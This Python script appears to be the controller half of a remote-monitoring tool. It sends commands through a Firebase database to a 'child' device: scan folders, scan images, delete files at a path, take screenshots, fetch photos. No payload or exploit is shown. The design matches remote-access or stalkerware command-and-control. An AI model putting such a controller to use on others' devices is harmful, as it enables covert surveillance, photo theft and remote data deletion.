import firebase_admin
from firebase_admin import credentials, db
import time
import threading

# -----------------------------
# Firebase Setup
# -----------------------------
cred = credentials.Certificate("serviceAccountKey.json")

firebase_admin.initialize_app(cred, {
    "databaseURL": "https://seasoure-default-rtdb.asia-southeast1.firebasedatabase.app/"
})

# Reference to commandData
command_ref = db.reference("commandData")

# -----------------------------
# Function to send command
# -----------------------------
def send_command(cmd, path=""):
    command = {
        "cmd": cmd,
        "path": path,
        "status": f"Command {cmd} sent at {time.strftime('%H:%M:%S')}"
    }
    command_ref.set(command)
    print(f"[PARENT] Sent command: {cmd}, path: {path}")

# -----------------------------
# Listener for status updates
# -----------------------------
def listen_status(event):
    if event.data:
        if isinstance(event.data, dict) and "status" in event.data:
            print(f"[CHILD STATUS] {event.data['status']}")
        elif isinstance(event.data, str):
            print(f"[CHILD STATUS] {event.data}")

def start_listener():
    command_ref.listen(listen_status)

# -----------------------------
# Main interactive loop
# -----------------------------
if __name__ == "__main__":
    # Start Firebase listener in a background thread
    threading.Thread(target=start_listener, daemon=True).start()

    while True:
        print("\nAvailable commands: scan | imagesscan | delete | screenshot | photos | exit")
        cmd = input("Enter command: ").strip().lower()

        path = ""
        if cmd in ["scan", "imagesscan", "delete"]:
            path = input("Enter path: ").strip()

        send_command(cmd, path)

        cont = input("Send another command? (y/n): ").strip().lower()
        if cont != "y":
            break
